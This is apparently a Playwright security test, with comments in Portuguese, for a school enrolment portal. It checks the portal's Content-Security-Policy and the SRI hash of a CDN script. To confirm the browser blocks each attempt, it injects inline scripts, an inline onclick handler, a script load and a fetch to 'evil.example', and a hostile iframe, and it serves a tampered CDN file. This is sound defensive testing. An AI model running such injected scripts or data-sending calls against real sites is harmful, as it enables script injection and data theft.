// Portal de Inscrições (inscricoes/): política de segurança de conteúdo (CSP) por meta tag
// e assinatura (SRI) do qrcode.min.js do cdnjs. Abre as duas páginas num navegador com os
// endereços externos simulados e confere que nada legítimo é bloqueado e que o ilegítimo é.
// Nenhum dado de aluno real: a matrícula usada é a fictícia 99999.
import fs from 'node:fs';
import { createHash } from 'node:crypto';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
const require = createRequire(import.meta.url);
const { chromium } = require('playwright');
const INS = fileURLToPath(new URL('../../../inscricoes/', import.meta.url));
const results = [];
const ok = (n, c, e = '') => results.push([c ? 'OK' : 'FALHOU', n, String(e).slice(0, 200)]);
const ler = f => fs.readFileSync(INS + f, 'utf8');

// ---------- 1. Conferências estáticas ----------
const htmlAluno = ler('index.html'), htmlCoord = ler('coordenador/index.html'), portalJs = ler('portal.js');
ok('index.html tem meta CSP', /<meta http-equiv="Content-Security-Policy" content="[^"]*default-src 'none'/.test(htmlAluno));
ok('coordenador/index.html tem meta CSP', /<meta http-equiv="Content-Security-Policy" content="[^"]*default-src 'none'/.test(htmlCoord));
ok('Nenhum atributo on*= nos HTML', !/\son[a-z]+="/i.test(htmlAluno) && !/\son[a-z]+="/i.test(htmlCoord));
ok('Nenhum <script> inline nos HTML', !/<script(?![^>]*\ssrc=)[^>]*>/i.test(htmlAluno) && !/<script(?![^>]*\ssrc=)[^>]*>/i.test(htmlCoord));
ok('portal.js não gera onclick="" por innerHTML', !/onclick="/.test(portalJs));
const sri = htmlAluno.match(/<script src="(https:\/\/cdnjs\.cloudflare\.com\/[^"]+qrcode\.min\.js)" integrity="(sha384-[A-Za-z0-9+/=]+)" crossorigin="anonymous"><\/script>/);
ok('qrcode.min.js tem integrity sha384 e crossorigin="anonymous"', !!sri);
const acoesUsadas = new Set([...htmlAluno.matchAll(/data-acao="([a-zA-Z]+)"/g), ...portalJs.matchAll(/data-acao="([a-zA-Z]+)"/g)].map(m => m[1]));
const blocoAcoes = (portalJs.match(/const ACOES=\{([\s\S]*?)\r?\n\};/) || [])[1] || '';
const acoesDefinidas = new Set([...blocoAcoes.matchAll(/(?:^|[\s,{])([a-zA-Z]+):/gm)].map(m => m[1]));
const semFuncao = [...acoesUsadas].filter(a => !acoesDefinidas.has(a));
ok('Toda data-acao usada tem função em ACOES (' + acoesUsadas.size + ' ações)', acoesUsadas.size >= 20 && semFuncao.length === 0, semFuncao.join(','));

// ---------- 2. Hash do arquivo real do cdnjs ----------
let qrcodeBytes = null, erroRede = '';
if (sri) {
  try { const r = await fetch(sri[1]); if (!r.ok) throw new Error('HTTP ' + r.status); qrcodeBytes = Buffer.from(await r.arrayBuffer()); }
  catch (e) { erroRede = String(e && e.message || e); }
}
const hashAtual = qrcodeBytes ? 'sha384-' + createHash('sha384').update(qrcodeBytes).digest('base64') : '';
ok('Hash SRI bate com o arquivo atual do cdnjs', !!sri && hashAtual === sri[2], erroRede || hashAtual);
if (!qrcodeBytes) qrcodeBytes = Buffer.from('/* sem rede: qrcode.min.js não baixado */');

// ---------- 3. Navegador ----------
const ORIGEM = 'https://idealolimpico.com.br';
const tipos = { html: 'text/html; charset=utf-8', js: 'application/javascript', css: 'text/css', png: 'image/png', jpg: 'image/jpeg', jpeg: 'image/jpeg', json: 'application/json' };
const chamadas = [];
let adulterar = false;
const browser = await chromium.launch();
const ctx = await browser.newContext();
await ctx.route(ORIGEM + '/inscricoes/**', route => {
  const u = new URL(route.request().url());
  let f = u.pathname.replace('/inscricoes/', '');
  if (f === '' || f.endsWith('/')) f += 'index.html';
  const p = INS + f;
  if (!fs.existsSync(p)) return route.fulfill({ status: 404, body: 'nao encontrado' });
  return route.fulfill({ status: 200, contentType: tipos[f.split('.').pop()] || 'application/octet-stream', body: fs.readFileSync(p) });
});
await ctx.route('https://cdnjs.cloudflare.com/**', route => route.fulfill({
  status: 200, contentType: 'application/javascript', headers: { 'access-control-allow-origin': '*' },
  body: adulterar ? Buffer.concat([qrcodeBytes, Buffer.from('\n/* alterado */')]) : qrcodeBytes }));
await ctx.route('https://ideal-olimpico-producao.marinhomalcher.workers.dev/**', route => {
  const req = route.request();
  if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: { 'access-control-allow-origin': ORIGEM, 'access-control-allow-headers': 'content-type', 'access-control-allow-methods': 'POST' } });
  let corpo = {}; try { corpo = JSON.parse(req.postData() || '{}'); } catch {}
  chamadas.push(corpo);
  return route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': ORIGEM },
    body: JSON.stringify({ ok: true, data: { email: '99999@aluno.grupoideal.com.br' } }) });
});
await ctx.route('https://script.google.com/**', route => route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>ponte simulada</title>' }));
await ctx.route('https://evil.example/**', route => route.fulfill({ status: 200, contentType: 'application/javascript', headers: { 'access-control-allow-origin': '*' }, body: 'window.__externo=true' }));
await ctx.addInitScript(() => {
  window.__cspv = [];
  document.addEventListener('securitypolicyviolation', e => window.__cspv.push(e.violatedDirective + ' ' + (e.blockedURI || '')));
});
async function novaPagina() {
  const page = await ctx.newPage();
  const erros = [], consola = [];
  page.on('pageerror', e => erros.push(e.message));
  page.on('console', m => { if (m.type() === 'error') consola.push(m.text()); });
  return { page, erros, consola, violacoes: () => page.evaluate(() => window.__cspv.splice(0)) };
}

// 3a. Página do aluno
{
  const { page, erros, consola, violacoes } = await novaPagina();
  await page.goto(ORIGEM + '/inscricoes/');
  await page.waitForTimeout(400);
  ok('Aluno: página carrega sem erro de JavaScript', erros.length === 0, erros.join('|'));
  ok('Aluno: nenhuma violação de CSP ao carregar', (await violacoes()).length === 0, consola.join('|'));
  ok('Aluno: qrcode.min.js carregou com SRI válido', await page.evaluate(() => typeof window.QRCode === 'function'));
  ok('Aluno: portal.js carregou (ACOES e google.script.run)', await page.evaluate(() => typeof ACOES === 'object' && !!(window.google && window.google.script && window.google.script.run)));
  await page.evaluate(() => { const d = document.createElement('div'); d.id = 'qrTeste'; document.body.append(d); new QRCode(d, { text: 'teste-csp', width: 64, height: 64 }); });
  await page.waitForTimeout(300);
  const qr = await page.evaluate(() => { const i = document.querySelector('#qrTeste img'); return i ? { data: i.src.startsWith('data:image'), largura: i.naturalWidth } : null; });
  ok('Aluno: QR code desenha imagem data: (img-src permite)', !!qr && qr.data && qr.largura > 0, JSON.stringify(qr));
  ok('Aluno: QR code não gerou violação de CSP', (await violacoes()).length === 0);
  // Botões fixos continuam ligados
  await page.fill('#matriculaInput', '99999');
  await page.click('#loginBtn');
  await page.waitForTimeout(400);
  ok('Aluno: RECEBER CÓDIGO chama solicitarCodigoAluno (fetch ao Worker permitido)', chamadas.some(c => c.method === 'solicitarCodigoAluno' && c.args && c.args[0] === '99999'), JSON.stringify(chamadas));
  ok('Aluno: etapa do código aparece', await page.evaluate(() => !document.getElementById('etapaCodigo').classList.contains('hidden') && document.getElementById('etapaMatricula').classList.contains('hidden')));
  ok('Aluno: PEDIR NOVO CÓDIGO entra em espera de 60 s', await page.evaluate(() => document.getElementById('reenviarBtn').disabled && /\(\d+s\)/.test(document.getElementById('reenviarBtn').textContent)));
  await page.click('text=TROCAR MATRÍCULA');
  ok('Aluno: TROCAR MATRÍCULA volta à matrícula', await page.evaluate(() => !document.getElementById('etapaMatricula').classList.contains('hidden')));
  // Botão criado por innerHTML (como os dos modais)
  await page.evaluate(() => { document.getElementById('modalActions').innerHTML = '<button id="btnTeste" class="secondary" data-acao="fecharModal">FECHAR</button>'; document.getElementById('modal').showModal(); });
  ok('Aluno: modal aberto para o teste', await page.evaluate(() => document.getElementById('modal').open));
  await page.click('#btnTeste');
  ok('Aluno: botão criado por innerHTML (data-acao) fecha o modal', await page.evaluate(() => !document.getElementById('modal').open));
  ok('Aluno: botão com data-arg recebe o argumento', await page.evaluate(() => { let visto = null; const antigo = ACOES.abrirPagamentoNovo; ACOES.abrirPagamentoNovo = a => { visto = a; }; document.body.insertAdjacentHTML('beforeend', '<button id="btnArg" data-acao="abrirPagamentoNovo" data-arg="7">x</button>'); document.getElementById('btnArg').click(); ACOES.abrirPagamentoNovo = antigo; return visto === '7'; }));
  ok('Aluno: sem erro de JavaScript nos cliques', erros.length === 0, erros.join('|'));
  ok('Aluno: cliques não geraram violação de CSP', (await violacoes()).length === 0);
  // A CSP de fato bloqueia o que não deve passar
  const inline = await page.evaluate(() => { window.__inline = false; const s = document.createElement('script'); s.textContent = 'window.__inline=true'; document.body.append(s); return window.__inline; });
  await page.waitForTimeout(200);
  let v = await violacoes();
  ok('Aluno: script inline é bloqueado', inline === false && v.some(x => x.startsWith('script-src')), v.join('|'));
  const externo = await page.evaluate(() => new Promise(r => { const s = document.createElement('script'); s.src = 'https://evil.example/e.js'; s.onload = () => r('carregou'); s.onerror = () => r('bloqueado'); document.body.append(s); setTimeout(() => r('tempo'), 1500); }));
  v = await violacoes();
  ok('Aluno: script de outro domínio é bloqueado', externo === 'bloqueado' && v.some(x => x.startsWith('script-src') && x.includes('evil.example')), externo + ' ' + v.join('|'));
  const conexao = await page.evaluate(() => fetch('https://evil.example/dados').then(() => 'passou', () => 'bloqueado'));
  await page.waitForTimeout(200);
  v = await violacoes();
  ok('Aluno: fetch para outro domínio é bloqueado (connect-src)', conexao === 'bloqueado' && v.some(x => x.startsWith('connect-src')), conexao + ' ' + v.join('|'));
  await page.evaluate(() => { const f = document.createElement('iframe'); f.src = 'https://script.google.com/x'; document.body.append(f); });
  await page.waitForTimeout(300);
  v = await violacoes();
  ok('Aluno: iframe é bloqueado (frame-src none)', v.some(x => x.startsWith('frame-src')), v.join('|'));
  const inlineHandler = await page.evaluate(() => { window.__h = false; document.body.insertAdjacentHTML('beforeend', '<button id="btnInline" onclick="window.__h=true">x</button>'); document.getElementById('btnInline').click(); return window.__h; });
  await page.waitForTimeout(200);
  v = await violacoes();
  ok('Aluno: onclick inserido por innerHTML não executa', inlineHandler === false && v.some(x => x.startsWith('script-src')), v.join('|'));
  await page.close();
}

// 3b. Arquivo do CDN adulterado: o navegador recusa pelo SRI
{
  adulterar = true;
  const { page, consola } = await novaPagina();
  await page.goto(ORIGEM + '/inscricoes/');
  await page.waitForTimeout(400);
  ok('SRI: qrcode.min.js alterado no CDN é recusado', await page.evaluate(() => typeof window.QRCode === 'undefined'), consola.join('|'));
  ok('SRI: o navegador registra o erro de integridade', consola.some(m => /integrity/i.test(m)), consola.join('|'));
  ok('SRI: o resto do portal continua funcionando sem o QR', await page.evaluate(() => typeof ACOES === 'object' && !!(window.google && window.google.script && window.google.script.run)));
  adulterar = false;
  await page.close();
}

// 3c. Página da coordenação
{
  const { page, erros, violacoes } = await novaPagina();
  await page.goto(ORIGEM + '/inscricoes/coordenador/');
  await page.waitForTimeout(400);
  ok('Coordenação: página carrega sem erro de JavaScript', erros.length === 0, erros.join('|'));
  ok('Coordenação: nenhuma violação de CSP ao carregar', (await violacoes()).length === 0);
  await page.click('#enterCoordinator');
  await page.waitForTimeout(600);
  const src = await page.evaluate(() => document.getElementById('backendBridge').src);
  ok('Coordenação: botão de acesso aponta o iframe para o Apps Script', src.startsWith('https://script.google.com/macros/s/'), src);
  const quadros = page.frames().map(f => f.url());
  ok('Coordenação: iframe do Apps Script é permitido (frame-src)', (await violacoes()).length === 0 && quadros.some(u => u.startsWith('https://script.google.com/macros/s/')), quadros.join('|'));
  await page.evaluate(() => { const f = document.createElement('iframe'); f.src = 'https://evil.example/'; document.body.append(f); });
  await page.waitForTimeout(300);
  const v = await violacoes();
  ok('Coordenação: iframe de outro domínio é bloqueado', v.some(x => x.startsWith('frame-src') && x.includes('evil.example')), v.join('|'));
  const inline = await page.evaluate(() => { window.__inline = false; const s = document.createElement('script'); s.textContent = 'window.__inline=true'; document.body.append(s); return window.__inline; });
  ok('Coordenação: script inline é bloqueado', inline === false);
  ok('Coordenação: sem erro de JavaScript', erros.length === 0, erros.join('|'));
  await page.close();
}
await browser.close();

for (const [estado, nome, extra] of results) console.log(estado.padEnd(7), nome, extra ? '— ' + extra : '');
const falhas = results.filter(x => x[0] === 'FALHOU').length;
console.log(falhas ? `FALHOU: ${falhas} falha(s) em ${results.length}` : `TODOS: ${results.length} verificações passaram`);
if (falhas) process.exitCode = 1;
